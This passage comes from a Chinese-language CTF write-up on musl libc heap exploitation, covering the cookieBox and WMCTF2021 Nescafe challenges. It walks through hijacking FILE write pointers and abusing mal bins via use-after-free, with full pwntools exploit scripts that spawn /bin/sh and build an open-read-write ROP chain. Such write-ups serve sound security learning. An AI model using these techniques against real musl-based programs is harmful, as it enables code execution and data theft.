c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">    <span class="comment">//会关闭三个文件流</span></span><br><span class="line">close_file(__stdin_used);</span><br><span class="line">close_file(__stdout_used);</span><br><span class="line">close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>close_file如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>f-&gt;wpos != f-&gt;wbase</code>，那么就会调用<code>f-&gt;write(f, 0, 0)</code>，并且第一个参数是f，我们只需要劫持stdin结构体的write函数指针为system，并且满足<code>f-&gt;wpos != f-&gt;wbase</code>，并将stdin开头的flags设置为&#x2F;bin&#x2F;sh就可以调用system(“&#x2F;bin&#x2F;sh”)。</p><p>如下图</p><p><img src="https://pic.imgdb.cn/item/6503d0ed661c6c8e54587383.jpg"></p><p>然后使程序正常退出或者调用exit函数就能够劫持程序流。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./cookieBox&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content:\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x295361</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">stdin   = libc_base + <span class="number">0x292200</span></span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(stdin-<span class="number">0x10</span>)+p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x100</span>,p64(stdin-<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">fake_stdin=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_stdin+=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_stdin+=p64(<span class="number">0</span>)<span class="comment">#wpos</span></span><br><span class="line">fake_stdin+=p64(<span class="number">0</span>)</span><br><span class="line">fake_stdin+=p64(<span class="number">1</span>)<span class="comment">#wbase</span></span><br><span class="line">fake_stdin+=p64(<span class="number">0</span>)+p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,fake_stdin)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="1-4-2-WMCTF2021-Nescafe"><a href="#1-4-2-WMCTF2021-Nescafe" class="headerlink" title="1.4.2 WMCTF2021 Nescafe"></a>1.4.2 WMCTF2021 Nescafe</h4><p>程序开启了沙箱</p><p><img src="https://pic.imgdb.cn/item/6503d4de661c6c8e545a0ed2.jpg"></p><p>四个功能</p><p><img src="https://pic.imgdb.cn/item/6503d54d661c6c8e545a1eac.jpg"></p><p>在del功能中存在uaf</p><p><img src="https://pic.imgdb.cn/item/6503f803661c6c8e546b82cc.jpg"></p><p>show功能仅允许使用一次</p><p><img src="https://pic.imgdb.cn/item/65046b12661c6c8e54bd1458.jpg"></p><p><img src="https://pic.imgdb.cn/item/65046ac6661c6c8e54bcb48f.jpg"></p><p>保护全开</p><p>由于存在静态堆区，所以依然只需要申请之后再show就可以得到libc地址。和上一题不同的是，这题退出时直接调用的_exit()，就无法使用打stdin结构体来利用，并且开启了沙箱，需要使用orw来得到flag。</p><p>首先看到初始的mal</p><p><img src="https://pic.imgdb.cn/item/65046c77661c6c8e54be501c.jpg"></p><p>申请一块chunk之后可以得到libc地址，mal如下图所示</p><p><img src="C:\Users\24990\AppData\Roaming\Typora\typora-user-images\image-20230915224121364.png" alt="image-20230915224121364"></p><p>得到libc地址之后，就可以通过unbin来劫持mal结构体；注意到最后面有一块bin的head指针距离存放堆指针的notelists非常近</p><p><img src="https://pic.imgdb.cn/item/65046dad661c6c8e54bf49d4.jpg"></p><p>可以先将堆块分配到mal结构体上，然后修改bins的末尾一字节到notelists，再将其他bins的head和next清空，就可以申请chunk到notelists了。</p><p><img src="https://pic.imgdb.cn/item/65046f9a661c6c8e54c0965f.jpg"></p><p>利用uaf修改chunk的next和prev指针为mal的bins的地址，然后申请新的chunk触发unbin，就会往mal.bins中写入一个bins的地址</p><p><img src="C:\Users\24990\AppData\Roaming\Typora\typora-user-images\image-20230915225702866.png" alt="image-20230915225702866"></p><p><img src="C:\Users\24990\AppData\Roaming\Typora\typora-user-images\image-20230915225724747.png" alt="image-20230915225724747"></p><p>这样，就可以将chunk申请到bins之上，进而控制bins</p><p><img src="https://pic.imgdb.cn/item/6504711b661c6c8e54c1edba.jpg"></p><p>将这些bins的head和tail指针全部清空，也就是将这些bins清空，然后将下面的指针的末尾一字节从0x70修改到0x30</p><p><img src="https://pic.imgdb.cn/item/650471c6661c6c8e54c25eac.jpg"></p><p>如此一来就能够申请chunk到notelists，进而控制所有堆块，后续泄露pie地址以及栈地址，将rop链写到edit功能的返回地址处即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x292e50</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">malbin = libc_base + <span class="number">0x292e00</span></span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#1</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(malbin)*<span class="number">2</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(p8(<span class="number">0</span>)*<span class="number">0x68</span>+p8(<span class="number">0x30</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">pie_base=u64(io.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x202040</span></span><br><span class="line">log.success(<span class="string">&#x27;pie_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pie_base)))</span><br><span class="line">environ_addr=libc_base+libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(pie_base+<span class="number">0x202040</span>)+p64(environ)+p64(<span class="number">0</span>)*<span class="number">4</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">edit_ret_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x70</span></span><br><span class="line">log.success(<span class="string">&#x27;edit_ret_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(edit_ret_addr)))</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000014862</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000001c237</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x000000000001bea2</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(pie_base+<span class="number">0x202040</span>)+p64(edit_ret_addr)+<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">payload=p64(pop_rdi)+p64(pie_base+<span class="number">0x202050</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(pie_base+elf.bss(<span class="number">0x500</span>))+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(pie_base+elf.bss(<span class="number">0x500</span>))+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>上面这种方法可能有点取巧，下面再介绍一种较为通用的方法：</p><p>在musl中，puts的函数调用链如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line">FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f)==l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> k, l = size*nmemb;</span><br><span class="line"><span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">FLOCK(f);</span><br><span class="line">k = __fwritex(src, l, f);</span><br><span class="line">FUNLOCK(f);</span><br><span class="line"><span class="keyword">return</span> k==l ? nmemb : k/size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f-&gt;lbf &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Match /^(.*\n|)/ */</span></span><br><span class="line"><span class="keyword">for</span> (i=l; i &amp;&amp; s[i<span class="number">-1</span>] != <span class="string">&#x27;\n&#x27;</span>; i--);</span><br><span class="line"><span class="keyword">if</span> (i) &#123;</span><br><span class="line"><span class="type">size_t</span> n = f-&gt;write(f, s, i);</span><br><span class="line"><span class="keyword">if</span> (n &lt; i) <span class="keyword">return</span> n;</span><br><span class="line">s += i;</span><br><span class="line">l -= i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(f-&gt;wpos, s, l);</span><br><span class="line">f-&gt;wpos += l;</span><br><span class="line"><span class="keyword">return</span> l+i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>puts(s)-&gt;fputs(s, stdout)-&gt;fwrite(s, 1, l, f)-&gt;__fwritex(src, l, f)-&gt;f-&gt;write(f, s, l)</code></p><p>puts函数最终会调用到stdout结构体中的write指针指向的函数，需要满足的条件为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;wend不为0</span><br><span class="line">l &gt; f-&gt;wend - f-&gt;wpos，将f-&gt;wend - f-&gt;wpos构造为0即可</span><br></pre></td></tr></table></figure><p>f-&gt;write的rdi为stdout结构体指针。</p><p>只需要劫持了stdout结构体的write指针就能够劫持程序执行流。</p><p>但是在musl中没有glibc中的setcontext函数，还需要找到一个能够跳转执行rop链的gadget</p><p>下面在这条gadget很符合需求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 0x30]; </span><br><span class="line">mov rsp, rdx; </span><br><span class="line">mov rdx, qword ptr [rdi + 0x38]; </span><br><span class="line">jmp rdx;</span><br></pre></td></tr></table></figure><p>将[rdi + 0x30]设置为rop链的地址，将[rdi + 0x38]设置为ret的地址，jmp rdx就会跳转执行ret，ret之后会继续执行rop链</p><p>那么该如何控制stdout结构体，mal的地址和stdout_FILE都位于libc之中，只需要泄露libc地址就好。然后利用unbin实现任意地址写</p><p>还需要注意的是，在进行unbin的时候，由于需要进行指针互写，需要保证我们伪造的next和prev都是可写的，如果要将chunk申请到stdin或者stdout上，满足条件的地址只能有<code>libc.sym[&#39;__stdin_FILE&#39;]+0x40</code>或者<code>libc.sym[&#39;__stdout_FILE&#39;]+0x40</code>，原因如下：</p><p>我们利用uaf将某个chunk的next和prev修改为了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = p64(mal+400-0x18) </span><br><span class="line">fake_chunk += p64(libc.sym[&#x27;__stdin_FILE&#x27;]+0x40)</span><br></pre></td></tr></table></figure><p>然后申请一个新chunk，触发unbin，<code>libc.sym[&#39;__stdin_FILE&#39;]+0x40</code>被链入到mal中</p><p><img src="https://pic.imgdb.cn/item/6506cb80661c6c8e54566e72.jpg"></p><p>然后我们继续申请，将会把<code>libc.sym[&#39;__stdin_FILE&#39;]+0x40</code>从mal中取出，触发unbin</p><p><img src="https://pic.imgdb.cn/item/6506ce7d661c6c8e5457aef2.jpg"></p><p>unbin的最后会将size的inuse位置1，且还会将下一个chunk的inuse位置1</p><p><img src="https://pic.imgdb.cn/item/6506e551661c6c8e545cb43e.jpg"></p><p><img src="https://pic.imgdb.cn/item/6506e581661c6c8e545cb915.jpg"></p><p>在这里我们的chunk size为0，能够正常执行。</p><p>但如果我们chunk size为一个很大的值，比如我们想从bin中取出<code>libc.sym[&#39;__stdout_FILE&#39;]+0x20</code></p><p><img src="https://pic.imgdb.cn/item/6506e635661c6c8e545ccbcb.jpg"></p><p>虽然next和prev都是可写的，但由于size太大了，在执行<code>NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</code>就会出错，同样的，next和prev如果有一个不可写，也是会报错的。</p><p>因此综合下来，只有<code>libc.sym[&#39;__stdin_FILE&#39;]+0x40</code>或者<code>libc.sym[&#39;__stdout_FILE&#39;]+0x40</code>是满足unbin的条件的，但是由于要劫持write，申请的chunk不能超过<code>libc.sym[&#39;__stdout_FILE&#39;]+0x30</code>，所以只能选择将chunk申请到<code>libc.sym[&#39;__stdin_FILE&#39;]+0x40</code>，然后事先在堆中写好ORW链，再通过上面提到的gadget完成orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span 